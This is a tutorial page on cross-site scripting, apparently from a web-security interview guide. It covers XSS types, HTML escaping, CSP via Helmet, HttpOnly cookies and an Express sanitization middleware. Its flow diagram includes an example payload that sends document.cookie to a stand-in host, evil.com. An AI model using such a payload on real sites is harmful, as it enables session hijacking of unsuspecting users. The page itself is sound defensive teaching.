# XSS

XSS is a common vulnerability in web applications. If your backend database stores unvalidated HTML inputs (like `<script>steal()</script>`) and renders them to other users, attackers can execute code inside their browsers. This allows them to steal session tokens, log keystrokes, or redirect users to malicious sites. Implementing strict sanitization and CSP headers protects your users.

### The Three Types of XSS
1. **Stored XSS (Persistent)**:
   * *Concept*: Malicious input is saved in the database (e.g. inside a blog comment or user profile field) and rendered to other users later.
   * *Impact*: High; every user who views the page executes the malicious script.
2. **Reflected XSS (Non-Persistent)**:
   * *Concept*: The script payload is sent in the request (e.g. inside a query parameter `/search?q=<script>...`) and echoed back in the HTML response without validation.
   * *Impact*: Medium; requires the attacker to trick the user into clicking a malicious link.
3. **DOM-based XSS**:
   * *Concept*: The vulnerability exists in the client-side JavaScript, which parses string inputs (like `location.hash`) and writes them directly to the page DOM using unsafe methods (like `innerHTML` or `document.write`).

### Mitigation Strategies
* **HTML Escaping**: Convert HTML characters to safe entities to prevent the browser from executing them as code:
  * `<` becomes `&lt;`
  * `>` becomes `&gt;`
  * `&` becomes `&amp;`
  * `"` becomes `&quot;`
  * `'` becomes `&#x27;`
* **Content Security Policy (CSP)**: An HTTP response header that restricts script execution to trusted domains, blocking inline scripts and unauthorized API requests.

## Deep Dive

### Securing Cookies against XSS
The most common goal of an XSS attack is stealing session cookies. If a script runs in the browser, it can read `document.cookie` and send the session token to the attacker's server.
* **The Fix**: Always set the **`HttpOnly`** flag on authentication and session cookies. This blocks client-side scripts from reading the cookie, securing the token even if an XSS vulnerability exists on the page.

## Visual Explanation

### Stored XSS Script Execution Flow
```text
  [ Attacker submits comment ] ──> "<script>fetch('evil.com?cookie=' + document.cookie)</script>"
                                               │
                                               ▼
                                  [ Saved in Database ]
                                               │
                                               ▼ (User visits page)
  [ Database returns comment ] ──> [ Server renders raw comment ] ──> [ Browser Executes Script ]
                                                                             │
                                                                             ▼ (Credential Leak)
  [ Attacker's Server ] <── GET /evil.com?cookie=session-id <────────────────┘
```

## Real-World Example
Consider a blog post commenting system. Instead of manual string replacements, you use a sanitization library (like `xss` or `dompurify`) to filter incoming comments. The library strips out executable tags (like `<script>`, `<iframe>`, or `onload` attributes) while keeping safe formatting tags (like `<b>` or `<i>`), protecting your users.

## Code Examples

### HTML Sanitization Middleware and CSP Configuration in Express

```javascript
// xss-prevention.js
// Dependencies required: npm install express xss helmet
const express = require('express');
const xss = require('xss');
const helmet = require('helmet');

const app = express();
app.use(express.json());

// 1. Defend using Content Security Policy (CSP) via Helmet
// Blocks inline script execution and restricts script file sources
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      // Allow scripts only from our domain; block unsafe-inline scripts
      scriptSrc: ["'self'"], 
      styleSrc: ["'self'", 'https://fonts.googleapis.com'],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  })
);

// 2. Custom XSS Sanitization Middleware
// Recursively scans request bodies and sanitizes string parameters
const sanitizeRequestBody = (req, res, next) => {
  const sanitize = (data) => {
    if (typeof data === 'string') {
      return xss(data); // Escapes HTML tags and attributes
    }
    if (typeof data === 'object' && data !== null) {
      for (const key in data) {
        data[key] = sanitize(data[key]);
      }
    }
    return data;
  };

  if (req.body) {
    req.body = sanitize(req.body);
  }
  next();
};

app.use(sanitizeRequestBody);

app.post('/api/comments', (req, res) => {
  const userComment = req.body.comment;
  
  // Input: "<script>alert('hack')</script> Hello!"
  // Output: "&lt;script&gt;alert('hack')&lt;/script&gt; Hello!"
  res.json({
    message: 'Comment parsed and sanitized successfully.',
    comment: userComment
  });
});

app.listen(3000, () => console.log('XSS protected server running on port 3000'));
```

## Best Practices
* **Always Escape User Output**: Escape all user-provided data before rendering it in HTML templates.
* **Configure HttpOnly Cookies**: Set the `httpOnly: true` flag on all session cookies to prevent XSS script access.
* **Implement strict CSP Policies**: Use Helmet to enforce a strict Content Security Policy, blocking inline scripts (`'unsafe-inline'`) and dynamic evaluations (`'unsafe-eval'`).
* **Sanitize Inputs**: Use mature sanitization libraries (like `dompurify` or `xss`) to validate rich-text inputs.

## Interview Questions

**Q:** What is Cross-Site Scripting (XSS)?

> **Answer:**
> XSS is a vulnerability where an application executes malicious scripts injected by attackers inside a user's browser, potentially exposing session tokens, logging keystrokes, or redirecting pages.

**Q:** What is the difference between Stored XSS and Reflected XSS?

> **Answer:**
> Stored XSS occurs when a malicious script is saved in the database (e.g. inside a comment) and executed whenever other users view the page. Reflected XSS is non-persistent; the script is passed in the request (e.g. in a query parameter) and echoed back in the response immediately, requiring the attacker to trick the user into clicking a malicious link.

**Q:** How does setting `HttpOnly` on cookies defend against XSS, and why does this not resolve the underlying XSS vulnerability?

> **Answer:**
> The `HttpOnly` flag blocks client-side JavaScript from reading the cookie, preventing an XSS script from stealing session tokens.
> However, it does not fix the XSS vulnerability itself. An attacker can still use the script to perform actions (like sending API requests, logging keystrokes, or modifying the page content) on behalf of the user within their active browser session.

**Q:** How would you configure a Content Security Policy (CSP) using Nonces to allow specific inline scripts to execute while blocking unauthorized inline scripts?

> **Answer:**
> To run inline scripts safely using CSP Nonces:
> 1. Generate a unique, cryptographically strong random token (a **Nonce**) on every request using middleware:
> ```javascript
> const crypto = require('crypto');
> app.use((req, res, next) => {
> res.locals.nonce = crypto.randomBytes(16).toString('base64');
> next();
> });
> ```
> 2. Configure your CSP headers to trust this specific nonce:
> ```javascript
> app.use(helmet.contentSecurityPolicy({
> directives: {
> scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`]
> }
> }));
> ```
> 3. Include this nonce in your HTML templates when rendering inline scripts:
> ```html
> <script nonce="<%= nonce %>">
> console.log('Safe inline script executing.');
> </script>
> ```
> The browser will execute only inline scripts that present the matching nonce value, blocking any attacker-injected scripts that lack the token.

---
Previous : [59_CSRF.md](59_CSRF.md) | Index : [00_index.md](00_index.md) | Next : [61_SQL_Injection.md](61_SQL_Injection.md)
